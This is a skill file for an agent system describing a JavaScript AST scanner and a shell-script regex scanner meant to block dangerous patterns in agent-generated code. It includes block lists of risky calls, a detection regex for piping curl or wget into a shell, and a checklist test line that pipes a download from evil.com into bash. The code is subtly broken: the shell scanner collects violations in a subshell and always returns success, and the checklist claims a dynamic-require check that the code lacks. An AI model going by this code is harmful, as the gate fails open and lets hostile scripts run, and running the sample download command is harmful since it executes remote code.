---
name: ast-injection-scanner
description: Statically scan agent-generated JavaScript and shell scripts for dangerous patterns using AST analysis (acorn/swc). Detect eval(), process.env access, dynamic require(), child_process usage, and path traversal before code execution.
origin: acorn (MIT), swc (Apache-2.0), ESTree spec, OWASP Code Injection Cheat Sheet
license: Apache-2.0
version: 1.0.0
compatibility: claude-sonnet-4-6, claude-opus-4-7
---

# AST Injection Scanner

Parse agent-generated code into an Abstract Syntax Tree and walk every node looking for dangerous call patterns — before any line is executed.

## When to Use

- Agent system that generates and hot-loads JS code at runtime
- Validating shell scripts produced by an agent before executing them
- Building a pre-commit hook that blocks dangerous code patterns
- Implementing YAMTAM sovereign-runtime-law (rule 51) AST gate

## Do NOT use for

- Linting developer code (use ESLint with security plugins instead)
- Python/Ruby code (use language-specific AST tools: ast module, RuboCop)
- Performance-critical paths where AST parse overhead is unacceptable

## acorn-based Scanner

```js
import { parse } from 'acorn';

const BLOCKED_CALLS = new Set(['eval', 'exec', 'execSync', 'execFile', 'spawnSync', 'fork']);
const BLOCKED_MEMBERS = [
  { object: 'process', property: 'env' },
  { object: 'child_process', property: null },  // any child_process method
  { object: 'fs', property: 'writeFileSync' },
  { object: 'fs', property: 'unlinkSync' },
];

function scanAST(source, filename = 'agent-generated') {
  const ast = parse(source, {
    ecmaVersion: 2022,
    sourceType: 'module',
    locations: true,
  });

  const violations = [];

  function walk(node) {
    if (!node || typeof node !== 'object') return;

    if (node.type === 'CallExpression') {
      const name = node.callee?.name ?? node.callee?.property?.name;
      if (BLOCKED_CALLS.has(name)) {
        violations.push({ type: 'BLOCKED_CALL', name, line: node.loc?.start.line });
      }
    }

    if (node.type === 'MemberExpression') {
      const obj  = node.object?.name;
      const prop = node.property?.name;
      for (const blocked of BLOCKED_MEMBERS) {
        if (obj === blocked.object && (blocked.property === null || prop === blocked.property)) {
          violations.push({ type: 'BLOCKED_MEMBER', expr: `${obj}.${prop}`, line: node.loc?.start.line });
        }
      }
    }

    // Recurse
    for (const key of Object.keys(node)) {
      if (['loc','start','end','type'].includes(key)) continue;
      const child = node[key];
      if (Array.isArray(child)) child.forEach(walk);
      else if (child?.type) walk(child);
    }
  }

  walk(ast);
  return { safe: violations.length === 0, violations, filename };
}
```

## Shell Script Scanner (Regex Fallback)

```bash
#!/usr/bin/env bash
# scan-shell.sh — block dangerous shell patterns in agent scripts

scan_shell() {
  local file="$1"
  local violations=()

  grep -nE '(eval |`.*`|\$\(|\bexec\b|LD_PRELOAD|curl\s+.*\|\s*bash|wget\s+.*\|\s*sh)' "$file" \
    | while IFS=: read -r line content; do
        echo "VIOLATION line ${line}: ${content}" >&2
        violations+=("line:${line}")
      done

  [[ ${#violations[@]} -gt 0 ]] && return 3
  return 0
}

scan_shell "$1"
```

## Dynamic require() Detection

```js
// Distinguishes static from dynamic require
function isDynamicRequire(node) {
  if (node.type !== 'CallExpression') return false;
  if (node.callee?.name !== 'require') return false;
  // Static: require('./module') — first arg is a string literal
  // Dynamic: require(variableName) — first arg is NOT a literal
  const arg = node.arguments?.[0];
  return !arg || arg.type !== 'Literal';
}
```

## Pre-execution Pipeline

```js
async function safeExecute(agentId, generatedCode) {
  // 1. AST scan
  const { safe, violations } = scanAST(generatedCode, `${agentId}-generated`);
  if (!safe) {
    swarmRouter.penalize(agentId, 15, 'AST_VIOLATION');
    throw new Error(`AST blocked: ${violations[0].type} at line ${violations[0].line}`);
  }

  // 2. Sign artifact
  const sig = signArtifact(generatedCode);

  // 3. Execute in sandbox
  return executeInSandbox(generatedCode, { signature: sig });
}
```

## Anti-Fake-Pass Checklist

- [ ] `eval()` in source → `violations` array non-empty
- [ ] `process.env.SECRET` in source → `BLOCKED_MEMBER` violation
- [ ] Static `require('./config')` → no violation (allowed)
- [ ] Dynamic `require(userInput)` → `BLOCKED_CALL` violation
- [ ] Shell scanner: `curl https://evil.com | bash` → exit code 3
